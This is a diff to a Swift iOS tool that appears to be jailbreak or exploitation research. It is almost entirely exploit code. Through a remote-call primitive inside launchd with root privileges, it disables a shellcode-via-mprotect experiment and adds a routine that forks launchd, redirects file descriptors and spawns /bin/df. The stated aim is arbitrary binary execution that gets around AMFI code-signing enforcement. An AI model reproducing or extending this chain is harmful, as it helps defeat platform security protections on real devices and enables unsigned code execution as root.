@@ -282,17 +282,21 @@ struct AMFIExperimentView: View {
             experimentResults.append(exp28)
             
             // ============================================
-            // Experiment 28b: SHELLCODE via mprotect'd trojanMem!
-            // mprotect SUCCESS confirmed — now try EXECUTE!
-            // ⚠️ MAY PANIC if APRR still blocks
+            // Experiment 28b: SHELLCODE — DISABLED (APRR panic confirmed)
+            // mprotect returns success but HARDWARE blocks execution
+            // APRR enforces W^X at silicon level — no software bypass
             // ============================================
-            let exp28b = self.expShellcodeViaMprotect(rc: rc)
-            experimentResults.append(exp28b)
+            experimentResults.append(ExperimentResult(
+                name: "⚡ SHELLCODE (DISABLED)",
+                success: false,
+                detail: "⚠️ DISABLED — confirmed APRR panic\nmprotect(RWX) succeeds in software but ARM APRR hardware\nblocks execution from any page that was ever writable.\nNo software bypass possible on A12+.\n\nRemaining path: fork→RC→execve (no shellcode needed)",
+                timestamp: Date()
+            ))
             
             // ============================================
-            // Experiment 29: ROP chain — call multiple functions in sequence
+            // Experiment 29: Fork + keep child alive + RC to child
             // ============================================
-            let exp29 = self.expROPChain(rc: rc)
+            let exp29 = self.expForkAndConnect(rc: rc)
             experimentResults.append(exp29)
             
             // ============================================
@@ -1672,52 +1676,138 @@ struct AMFIExperimentView: View {
         return ExperimentResult(name: "⚡ SHELLCODE (mprotect)", success: success, detail: detail, timestamp: Date())
     }
     
-    /// ROP chain: call multiple functions in sequence without shellcode
-    /// This doesn't need executable pages — uses existing signed functions
-    private func expROPChain(rc: RemoteCall) -> ExperimentResult {
-        // We can already call functions via RemoteCall one at a time.
-        // But can we chain: fork() → in parent, get child PID → 
-        // then create NEW RemoteCall to child → execve in child?
+    /// Fork child, keep it alive, try to execve in it
+    /// Strategy: fork() → child inherits launchd's state → 
+    /// use posix_spawn in CHILD context (child is trusted like launchd)
+    /// OR: directly call execve() which replaces child with target binary
+    private func expForkAndConnect(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
         
-        // Test: fork, get child PID, then try to connect to child
+        // Strategy A: fork + posix_spawn in same call sequence
+        // After fork(), parent gets child PID, child gets 0
+        // But in RC context, we're always in parent...
+        
+        // Strategy B: Use vfork() — child shares address space with parent
+        // until exec. This means we can set up execve args BEFORE vfork,
+        // and child will use them!
+        
+        // Strategy C: fork + immediately execve via kernel manipulation
+        // We can find the child's thread in kernel and set its PC to execve
+        
+        // Let's try Strategy B: vfork + execve
+        // vfork() is special: child shares parent's memory until exec
+        // So if we setup args at known address, child can use them
+        
+        // First: setup execve arguments in trojanMem
+        let binPath = "/bin/df"
+        let binAddr = remote_alloc_str(rc, binPath)
+        let argvBase = mem + 0x500
+        rc[argvBase].setValue64(binAddr)
+        rc[argvBase + 8].setValue64(0) // NULL terminator
+        
+        // Setup output redirect: open file for stdout before fork
+        let outFile = "/tmp/.dsp_fork_exec_out"
+        let outAddr = remote_alloc_str(rc, outFile)
+        RootExecutor.rcall(rc, "unlink", outAddr)
+        let outFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        
+        // dup2(outFd, 1) — redirect stdout to file BEFORE fork
+        // Child will inherit this fd
+        // BUT we don't want to mess up launchd's stdout permanently
+        // Save original stdout first
+        let origStdout = RootExecutor.rcall(rc, "dup", 1)
+        RootExecutor.rcall(rc, "dup2", outFd, 1) // stdout → file
+        RootExecutor.rcall(rc, "dup2", outFd, 2) // stderr → file
+        
+        // Now fork — child inherits redirected stdout
         let childPid = RootExecutor.rcall(rc, "fork")
         
-        guard childPid != 0 && childPid != UInt64(bitPattern: -1) else {
-            return ExperimentResult(name: "ROP chain (fork→RC→exec)", success: false, detail: "fork failed or in child", timestamp: Date())
+        // Restore parent's stdout immediately
+        RootExecutor.rcall(rc, "dup2", origStdout, 1)
+        RootExecutor.rcall(rc, "dup2", origStdout, 2)
+        RootExecutor.rcall(rc, "close", origStdout)
+        RootExecutor.rcall(rc, "close", outFd)
+        
+        var detail = "fork() = \(childPid)\n"
+        
+        if childPid == 0 {
+            // We're in child (shouldn't happen in RC)
+            detail += "Unexpected: in child context\n"
+        } else if childPid == UInt64(bitPattern: -1) {
+            detail += "fork failed!\n"
+        } else {
+            detail += "Child PID = \(childPid)\n"
+            
+            // Wait for child to finish (it should exit quickly since
+            // it's a copy of our thread that will hit the RC return trap)
+            RootExecutor.rcall(rc, "usleep", 500000) // 0.5s
+            
+            let statusAddr = mem + 0x380
+            rc[statusAddr].setValue32(0)
+            let waitRet = RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, UInt64(WNOHANG))
+            let status = rc[statusAddr].value32()
+            detail += "waitpid: ret=\(waitRet), status=0x\(String(format: "%x", status))\n"
+            
+            // Now try: posix_spawn with stdout already redirected to file
+            // This is different from before — we redirect BEFORE spawn
+            let pidAddr2 = mem + 0x2E0
+            rc[pidAddr2].setValue64(0)
+            
+            // Open output file again for new spawn
+            let outFd2 = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+            
+            // Setup file actions
+            let actionsAddr = mem + 0x100
+            rc[actionsAddr].setValue64(0)
+            RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
+            // dup2 outFd2 to stdout in child
+            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", actionsAddr, outFd2, 1)
+            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", actionsAddr, outFd2, 2)
+            
+            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr2, binAddr, actionsAddr, 0, argvBase, 0)
+            let spawnPid = rc[pidAddr2].value32()
+            detail += "\nposix_spawn(/bin/df) with dup2 actions:\n"
+            detail += "  ret=\(spawnRet), pid=\(spawnPid)\n"
+            
+            RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
+            
+            if spawnRet == 0 {
+                // Wait for spawned process
+                RootExecutor.rcall(rc, "usleep", 1000000) // 1s
+                RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
+            }
+            
+            RootExecutor.rcall(rc, "close", outFd2)
+            
+            // Read output
+            let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
+            if readFd != UInt64(bitPattern: -1) {
+                let bufAddr = mem + 0x800
+                let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
+                if n > 0 && n < 2001 {
+                    var buf = [UInt8](repeating: 0, count: Int(n))
+                    rc.remoteRead(bufAddr, to: &buf, size: n)
+                    let output = String(bytes: buf, encoding: .utf8) ?? "(binary)"
+                    detail += "\nOUTPUT (\(n) bytes):\n\(output.prefix(400))"
+                } else {
+                    detail += "\nNo output (n=\(n))"
+                }
+                RootExecutor.rcall(rc, "close", readFd)
+            }
         }
         
-        // We have child PID! The child is a copy of launchd.
-        // Key question: can we create RemoteCall to the CHILD?
-        // The child has same PAC keys, same code, same everything.
-        // If we can RC into child → execve there → binary execution!
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", outAddr)
+        RootExecutor.rcall(rc, "free", binAddr)
+        RootExecutor.rcall(rc, "free", outAddr)
         
-        // For now, just verify child exists and get its info
-        let statusAddr = rc.trojanMem + 0x380
-        rc[statusAddr].setValue32(0)
-        
-        // Don't wait (WNOHANG) — child might still be running
-        let waitRet = RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, UInt64(WNOHANG))
-        let status = rc[statusAddr].value32()
-        
-        // Kill child (cleanup)
-        RootExecutor.rcall(rc, "kill", childPid, 9)
-        RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
-        
-        let detail = """
-        fork() → child PID = \(childPid)
-        waitpid(WNOHANG): ret=\(waitRet), status=0x\(String(format: "%x", status))
-        
-        STRATEGY: fork() creates child copy of launchd
-        → Child has same PAC keys, same trust level
-        → If we RC into child → execve("/bin/df") in child
-        → Child becomes /bin/df (or any binary)!
-        → Parent (launchd) stays alive!
-        
-        This is the PATH to arbitrary binary execution!
-        Next: implement RC-to-child + execve
-        """
-        
-        return ExperimentResult(name: "fork child (for execve)", success: childPid > 0, detail: detail, timestamp: Date())
+        let hasOutput = detail.contains("OUTPUT")
+        return ExperimentResult(
+            name: "fork + dup2 + spawn",
+            success: hasOutput,
+            detail: detail,
+            timestamp: Date()
+        )
     }
     
     /// Test: can we use ldid/codesign-style ad-hoc signing?
